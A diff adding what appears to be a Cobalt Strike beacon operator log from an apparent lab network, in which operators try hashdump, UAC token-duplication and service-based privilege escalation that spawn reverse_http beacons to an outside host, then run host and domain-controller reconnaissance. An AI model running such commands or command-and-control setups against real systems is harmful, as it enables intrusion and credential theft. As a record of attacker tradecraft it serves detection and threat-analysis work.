@@ -1,0 +1,127 @@
+12/01 00:09:55 UTC [input] <neo> screenshot
+12/01 00:09:55 UTC [task] <T1113, T1093> Tasked beacon to take screenshot
+12/01 00:10:31 UTC [input] <neo> shell dir dns.exe
+12/01 00:10:31 UTC [task] <T1059> Tasked beacon to run: dir dns.exe
+12/01 00:10:42 UTC [checkin] host called home, sent: 164476 bytes
+12/01 00:10:43 UTC [output]
+received screenshot of Program Manager from hostvm-demo-1 (52kb)
+
+12/01 00:10:43 UTC [output]
+received output:
+ Volume in drive C has no label.
+ Volume Serial Number is 7C03-64E2
+
+ Directory of C:\Users\hostvm-demo-1\Desktop
+
+File Not Found
+
+
+12/01 00:39:25 UTC [input] <neo> hashdump
+12/01 00:39:25 UTC [error] this command requires administrator privileges
+12/01 00:40:15 UTC [input] <neo> elevate uac-token-duplication default_listener
+12/01 00:40:15 UTC [task] <T1088, T1093> Tasked beacon to spawn windows/beacon_http/reverse_http (91.92.251.25:8888) in a high integrity process (token duplication)
+12/01 00:40:48 UTC [checkin] host called home, sent: 255207 bytes
+12/01 00:40:49 UTC [output]
+received output:
+[-] Failed. Tried 1 process tokens and taskmgr.exe
+
+12/01 00:41:37 UTC [input] <neo> elevate svc-exe default_listener
+12/01 00:41:38 UTC [task] <T1035, T1050> Tasked beacon to run windows/beacon_http/reverse_http (91.92.251.25:8888) via Service Control Manager (\\127.0.0.1\ADMIN$\ad6635c.exe)
+12/01 00:41:38 UTC [indicator] service: \\. ad6635c
+12/01 00:41:38 UTC [indicator] file: 6ff7d1fe6edcfc93dded5631fd47eaa2 324608 bytes \\127.0.0.1\ADMIN$\ad6635c.exe
+12/01 00:41:49 UTC [checkin] host called home, sent: 326617 bytes
+12/01 00:41:49 UTC [error] could not upload file: 5 - ERROR_ACCESS_DENIED
+12/01 00:41:49 UTC [error] Could not open service control manager on .: 5
+12/01 00:42:24 UTC [input] <neo> pwd
+12/01 00:42:25 UTC [task] <> Tasked beacon to print working directory
+12/01 00:42:49 UTC [checkin] host called home, sent: 8 bytes
+12/01 00:42:49 UTC [output]
+Current directory is C:\Users\hostvm-demo-1\Desktop
+
+12/01 00:48:52 UTC [input] <neo> net view
+12/01 00:48:52 UTC [task] <T1018, T1093> Tasked beacon to run net view
+12/01 00:49:50 UTC [checkin] host called home, sent: 89168 bytes
+12/01 00:49:52 UTC [output]
+received output:
+List of hosts:
+
+
+
+12/01 00:50:52 UTC [output]
+received output:
+ Server Name             IP Address                       Platform  Version  Type   Comment
+ -----------             ----------                       --------  -------  ----   -------
+[-] Error: 6118
+
+
+12/01 00:55:18 UTC [input] <neo> shell dir a.exe
+12/01 00:55:18 UTC [task] <T1059> Tasked beacon to run: dir a.exe
+12/01 00:55:53 UTC [checkin] host called home, sent: 40 bytes
+12/01 00:55:53 UTC [output]
+received output:
+ Volume in drive C has no label.
+ Volume Serial Number is 7C03-64E2
+
+ Directory of C:\Users\hostvm-demo-1\Desktop
+
+File Not Found
+
+
+12/01 01:47:01 UTC [input] <G> systeminfo
+12/01 01:47:01 UTC [error] Unknown command: systeminfo
+12/01 01:47:04 UTC [input] <G> shell systeminfo
+12/01 01:47:04 UTC [task] <T1059> Tasked beacon to run: systeminfo
+12/01 01:47:59 UTC [checkin] host called home, sent: 41 bytes
+12/01 01:49:09 UTC [output]
+received output:
+
+Host Name:                 DC1
+OS Name:                   Microsoft Windows Server 2019 Standard
+OS Version:                10.0.17763 N/A Build 17763
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Primary Domain Controller
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:   
+Product ID:                00429-00000-00001-AA815
+Original Install Date:     2/28/2023, 10:06:59 AM
+System Boot Time:          10/27/2023, 2:15:40 AM
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               x64-based PC
+Processor(s):              8 Processor(s) Installed.
+                           [01]: Intel64 Family 6 Model 44 Stepping 2 GenuineIntel ~2667 Mhz
+                           [02]: Intel64 Family 6 Model 44 Stepping 2 GenuineIntel ~2667 Mhz
+                           [03]: Intel64 Family 6 Model 44 Stepping 2 GenuineIntel ~2667 Mhz
+                           [04]: Intel64 Family 6 Model 44 Stepping 2 GenuineIntel ~2667 Mhz
+                           [05]: Intel64 Family 6 Model 44 Stepping 2 GenuineIntel ~2667 Mhz
+                           [06]: Intel64 Family 6 Model 44 Stepping 2 GenuineIntel ~2667 Mhz
+                           [07]: Intel64 Family 6 Model 44 Stepping 2 GenuineIntel ~2667 Mhz
+                           [08]: Intel64 Family 6 Model 44 Stepping 2 GenuineIntel ~2667 Mhz
+BIOS Version:              Phoenix Technologies LTD 6.00, 7/3/2018
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
+Total Physical Memory:     8,191 MB
+Available Physical Memory: 5,387 MB
+Virtual Memory: Max Size:  9,471 MB
+Virtual Memory: Available: 6,114 MB
+Virtual Memory: In Use:    3,357 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    virttest.local
+Logon Server:              \\DC1
+Hotfix(s):                 1 Hotfix(s) Installed.
+                           [01]: KB4464455
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Intel(R) 82574L Gigabit Network Connection
+                                 Connection Name: Ethernet0
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 192.168.100.5
+                                 [02]: fe80::1c9c:8aa4:3c2c:d2fb
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+
+
